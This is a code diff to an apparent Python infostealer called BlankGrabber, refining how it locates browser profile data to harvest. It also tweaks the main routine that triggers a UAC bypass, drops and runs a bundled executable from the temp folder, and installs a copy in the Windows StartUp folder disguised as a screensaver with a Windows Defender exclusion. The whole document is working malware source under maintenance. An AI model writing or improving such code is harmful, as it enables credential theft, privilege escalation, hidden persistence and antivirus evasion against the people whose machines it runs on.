@@ -418,7 +418,7 @@ class BlankGrabber:
             "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
             "Chrome SxS": os.path.join(self.localappdata, "Google", "Chrome SxS", "User Data"),
             "Chrome": self.chromefolder,
-            "FireFox" : self.roaming + "\\Mozilla\\Firefox\\Profiles",
+            "FireFox" : os.path.join(self.roaming, "Mozilla", "Firefox", "Profiles"),
             "Epic Privacy Browse": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
             "Microsoft Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
             "Uran": os.path.join(self.localappdata, "uCozMedia", "Uran", "User Data"),
@@ -650,7 +650,7 @@ class BlankGrabber:
 if __name__ == "__main__":
     if not is_admin():
         uac_bypass()
-    if os.path.isfile(boundfile := os.path.join(sys._MEIPASS, "bound.exe")):
+    if os.path.isfile(boundfile := os.path.join(sys._MEIPASS, "bound.exe")) and os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1] != "startup":
         shutil.copy(boundfile, boundfile := os.path.join(os.getenv("temp"), f"{generate()}.exe"))
         os.startfile(boundfile)
 
@@ -672,7 +672,7 @@ if __name__ == "__main__":
             if STARTUP:
                 if os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1].lower() != "startup":
                     try:
-                        exepath = os.path.join("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\", f"ScreenSaver-{generate()}.scr")
+                        exepath = os.path.join("C:", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp", f"ScreenSaver-{generate()}.scr")
                         BlankGrabber.copy("Blank", sys.executable, exepath)
                         wd_exclude(exepath)
                     except Exception:
